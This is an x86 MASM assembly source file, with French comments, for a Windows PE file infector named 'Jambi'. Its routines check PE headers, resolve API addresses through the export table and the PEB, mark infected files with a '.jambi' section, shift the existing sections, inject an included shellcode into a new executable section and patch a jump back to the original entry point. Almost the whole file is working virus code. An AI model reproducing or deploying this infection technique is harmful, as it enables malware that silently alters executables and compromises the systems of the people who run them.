;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;                     _______           _     _                     ;;;;;;
;;;;;;                    (_______)         | |   (_)                    ;;;;;;
;;;;;;                         _ _____ ____ | |__  _                     ;;;;;;
;;;;;;                     _  | (____ |    \|  _ \| |                    ;;;;;;
;;;;;;                    | |_| / ___ | | | | |_) ) |                    ;;;;;;
;;;;;;                     \___/\_____|_|_|_|____/|_|                    ;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; C'est degueulasse

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;                  checkPE    		                 ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;   	Return start of IMAGE_NT_HEADERS		     ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
checkPE PROC base:DWORD

	push		ebx
	
	mov			eax, base
	mov			bx, [eax]			; on arrive sur MZ
	cmp			bx, 5a4dh			; On verifie l entete MZ
	jne			checkPE_error
	
	mov			ebx, [eax+3ch]
	
	add			eax, ebx			; on arrive sur PE

	mov			ebx, [eax]					
	cmp			ebx, 00004550h		; On verifie l entete PE
	jne			checkPE_error

	pop			ebx
	ret

	checkPE_error:
	pop			ebx
	xor			eax, eax
	ret

checkPE ENDP

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;                  getFunctionAddr                  ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;   Return 0 if file is infected else size of file  ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

getFunctionAddr PROC baseAddress:DWORD, funcName:DWORD
	
	LOCAL EOT:DWORD
	LOCAL EAT:DWORD
	
	;; Save register
	push		esi
	push		edi
	push		ebx
	push		ecx
	push		edx
	
	pushad
	mov		eax, funcName
	print "Loading "
	popad

	pushad
	mov		eax, funcName
	print eax, 13, 10
	popad
	
	mov			esi, baseAddress
	mov			edi, [esi+3ch]			; get lfanew
	add			esi, edi				; GOTO PE header

	add			esi, 18h				; Go IMAGE_OPTIONAL_HEADER

	mov			ebx, [esi+60h]			; Get RVA du premier element du DATA DIRECTORY : IMAGE_DIRECTORY_ENTRY_EXPORT
	
	mov			edi, baseAddress
	
	add			edi, ebx				; GO IMAGE_EXPORT_DIRECTORY
	
	mov			ebx, [edi+12]			; get Name

	add			ebx, baseAddress		; pointer (RVA) to ASCII DLL name
	
	mov			edx, [edi+24]			; NB of Names in ENT > Export name table
	imul		edx, 4
	
	mov			esi, [edi+28]			; pointer (RVA) to AddressOfFunctions (EAT)
	add			esi, baseAddress
	mov			EAT, esi				; Save AddressOfFunctions
	
	mov			esi, [edi+36]			; pointer (RVA) to EOT
	add			esi, baseAddress
	mov			EOT, esi				; Save Address of EOT
	
	mov			esi, [edi+32]			; pointer (RVA) to AddressOfNames (ENT)
	add			esi, baseAddress		; we are in ENT
	
	;; Loop on Export name table
	xor			ecx, ecx

showfunction:
	mov			ebx, baseAddress		; Get BA
	add			ebx, [esi + ecx]		; Get string pointer
	add			ecx, 4
	
	pushad
	push		ebx
	push		funcName
	call		str_compare
	cmp			eax, 1
	je			found
		
	cmp			ecx, edx
	jne			showfunction
	jmp			fuck
	
found:
	popad
	sub			ecx, 4
	
	;; GetProcAddress
	mov			esi, EOT				; Get EOT
	shr			ecx, 1					; /2 cause of WORD alignment for EOT
	movzx		ecx, word ptr [esi+ecx]	; Get index in EAT from EOT
	imul		ecx, 4					; index * 4
	mov			esi, EAT				; Get address (NOT RVA)of EAT	
	mov			esi, [esi+ecx]			; get rva of function

	add			esi, baseAddress	
	mov			eax, esi
	
	pop			edx
	pop			ecx
	pop			ebx
	pop			edi
	pop			esi
	ret
fuck:
	xor			eax, eax
	pop			edx
	pop			ecx
	pop			ebx
	pop			edi
	pop			esi
	ret
getFunctionAddr ENDP



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;                    isInfected                     ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;   Return 1 if file is infected else 0			 ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

isInfected PROC KBA:DWORD, fileName:DWORD
	
	;LOCAL fileSize:DWORD
	LOCAL hFile:DWORD
	LOCAL IBaseAddress:DWORD
	LOCAL hMap:DWORD


	jmp finishdeclare
		infectName		db	".jambi", 0
	finishdeclare:
	

	;; Save register
	push		esi
	push		edi
	push		ecx
	push		edx
	
	;; CreateFile
	push		fileName
	push		0ffffffffh
	call		fileOpen
	cmp			eax, 0
	je			Infected_1
	mov			hFile, eax			; Sauvegarde du handler du fichier original

	push		hFile
	call		mapFile
	cmp			eax, 0
	je			Infected_2
	mov			IBaseAddress, eax
	mov			hMap, ebx

	mov			esi, IBaseAddress
	add			esi, [esi+3ch]			; GOTO PE header
	movzx		ebx, word ptr [esi+6]	; get nSection
	movzx		edx, word ptr [esi+20]	; get SizeOfOptionalHeader
	add			esi, 18h				; Go IMAGE_OPTIONAL_HEADER
	add			esi, edx				; Go to First Section Header
	
	imul		ebx, 40					; nSection * 40

	
	;; GOTO last section name and if it's jambi we say FUCK YOU DAMN MOTHERFUCKER
	add			esi, ebx
	sub			esi, 40
	push		esi
	push		offset infectName
	call		str_compare
	cmp			eax, 1
	je			Infected_3

	push		IBaseAddress
	call		UnmapViewOfFile

	push		hMap
	call		CloseHandle
	
	push		hFile
	call		CloseHandle
	
	xor			eax, eax
	pop			edx
	pop			ecx
	pop			edi
	pop			esi
	ret
	
Infected_3:
	push		IBaseAddress
	call		UnmapViewOfFile 

	push		hMap
	call		CloseHandle

Infected_2:
	push		hFile
	call		CloseHandle

Infected_1:
	mov			eax, 1
	pop			edx
	pop			ecx
	pop			edi
	pop			esi
	ret
isInfected ENDP


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;                 CreateSectionHeader               ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;                   Return nothing                  ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

CreateSectionHeader PROC index:DWORD, VirtualAddress:DWORD, VirtualSize:DWORD, PointerToRawData:DWORD
	
	push		eax
	push		ecx
	
	mov			eax, index
	;; Creation du header de la nouvelle section
	mov			ecx, 6d616a2eh			; Name (.jambi)
	mov			[eax], ecx
	add			eax, 4
	mov			ecx, 00006962h
	mov			[eax], ecx
	add			eax, 4
	
	mov			ecx, VirtualSize		; VirtualSize
	mov			[eax], ecx
	add			eax, 4

	mov			ecx, VirtualAddress		; VirtualAddress
	mov			[eax], ecx
	add			eax, 4
	
	mov			ecx, 00000200h			; SizeOfRawData
	mov			[eax], ecx
	add			eax, 4
	
	mov			ecx, PointerToRawData	; PointerToRawData
	mov			[eax], ecx
	add			eax, 4
	
	mov			ecx, 00000000h			; PointerToRelocations
	mov			[eax], ecx
	add			eax, 4
	
	mov			ecx, 00000000h			; PointerToLinenumbers
	mov			[eax], ecx
	add			eax, 4
	
	mov			ecx, 00000000h			; NumberOfRelocations + NumberOfLinenumbers
	mov			[eax], ecx
	add			eax, 4
	
	mov			ecx, 60500060h			; Characteristics (Readable + eXecutable)
	mov			[eax], ecx
	add			eax, 4
	
	pop			ecx
	pop			eax
	ret
CreateSectionHeader ENDP



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;                  getAddrOfSection                 ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;   Return section address in eax and size in ebx   ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

getAddrOfSection PROC baseAddress:DWORD
	
	LOCAL nSection:WORD
	
	jmp enddeclare
	sectionName			db	".jambi", 0
	replaceName			db	".data", 0
	enddeclare:
	
	;; Save register
	push		esi
	push		edi
	push		ecx
	push		edx
	
	mov			esi, baseAddress
	add			esi, [esi+3ch]			; GOTO PE header
	movzx		ebx, word ptr [esi+6]	; get nSection
	movzx		edx, word ptr [esi+20]	; get SizeOfOptionalHeader
	add			esi, 18h				; Go IMAGE_OPTIONAL_HEADER
	add			esi, edx				; Go to First Section Header
	
	imul		ebx, 40					; nSection * 40
	xor			ecx, ecx				; initialise counter = 0
	
	;; GOTO last section name and if it's jambi we say FUCK YOU DAMN MOTHERFUCKER
	mov			edi, esi
	add			edi, ebx
	sub			edi, 40
	push		edi
	push		offset sectionName
	call		str_compare
	cmp			eax, 1
	je			jambifoundorendofloop
	
	
sectionloop:

	pushad
	print		esi, 13, 10
	popad

	push		esi
	push		offset replaceName
	call		str_compare
	cmp			eax, 1
	je			datafound
	
	add			esi, 40
	add			ecx, 40
	
	cmp			ecx, ebx
	jne			sectionloop
	jmp			jambifoundorendofloop
datafound:

	print "DATA FOUND !!!", 13, 10

	mov			eax, [esi+14h]		; pointer to raw data (RVA) (pointeur vers la section)
	add			eax, baseAddress
	
	mov			ebx, [esi+10h]		; size of raw data (taille de la section)
	pop			edx
	pop			ecx
	pop			edi
	pop			esi
	ret

jambifoundorendofloop:
	print ".jambi found or end of loop", 13, 10
	xor			eax, eax
	pop			edx
	pop			ecx
	pop			edi
	pop			esi
	ret
getAddrOfSection ENDP



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;                   addCodeInJambi                  ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;                   Returns nothing                 ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

addCodeInJambi PROC IBaseAddress:DWORD, jambiRAddr:DWORD, IImageBase:DWORD, IEntryPoint:DWORD

	mov			edi, IBaseAddress
	add			edi, jambiRAddr
	mov			esi, shellcode
	
addshellcode:					; Copy the shellcode in section .jambi
	cmp		 	esi, endshellcode
	je 			exitloop
	mov		 	bl, [esi]
	mov	 		[edi], bl
	inc	 		esi
	inc	 		edi
	jmp 		addshellcode

	exitloop:

	mov		ebx, IImageBase
	add		ebx, IEntryPoint
	mov		[edi-6], ebx			; Replace by the OEP (cf end of shellcode)
	ret

addCodeInJambi ENDP

shellcode:						; This is the "shellcode" injected in target softwares
	include		shellcode.asm
	;mov			eax, 0
	;infinite:
	;inc			eax
	;cmp			eax, 055555555h
	;pushad
	;popad
	;jne			infinite
	silent_failure:	
	mov			eax, 42424242h	; This number will be replaced by OEP

	jmp			eax
endshellcode:


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;                  computeJambiAddr                 ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;              Returns section jambi Addr           ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

computeJambiAddr PROC IAlignment:DWORD, lastSectionSize:DWORD, lastSectionAddr:DWORD
	xor			edx, edx
	mov			ecx, IAlignment
	mov			eax, lastSectionSize
	div			ecx

	test		edx, edx
	jg			alignSection
	jmp			noalign
	
alignSection:
	inc			eax
noalign:
	imul		eax, ecx
	add			eax, lastSectionAddr
	ret
computeJambiAddr ENDP



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;                    moveSections                   ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;               Returns end of headers              ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

moveSections PROC endOfHeaders:DWORD, IBaseAddress:DWORD, fileSize:DWORD
	
	mov			edi, IBaseAddress	; EDI = Début du mapping
	add			edi, fileSize		; EDI += Taille fichier originel
	mov			esi, edi
	add			edi, 200h
	
	;; Deplacements des sections `edi` octets plus loin dans le fichier
movesections:
	sub			edi, 1
	sub			esi, 1
	cmp			esi, endOfHeaders
	jb			endMove
	mov			dl, [esi]
	mov			[edi], dl
	jmp			movesections
endMove:
	mov			eax, endOfHeaders
	ret
moveSections ENDP



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;                 getKernelBaseAddr                 ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;             Returns kernel base address           ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

getKernelBaseAddr PROC
	mov			eax, fs:[030h]		; pointer to PEB
	mov			eax, [eax+0Ch]		; PEB->Ldr
	mov			eax, [eax+1Ch]		; PEB->Ldr.InLoadOrderModuleList.Flink 
	mov			eax, [eax]			; second entry
	mov			eax, [eax+8h]		; kernel base address
	ret
getKernelBaseAddr ENDP
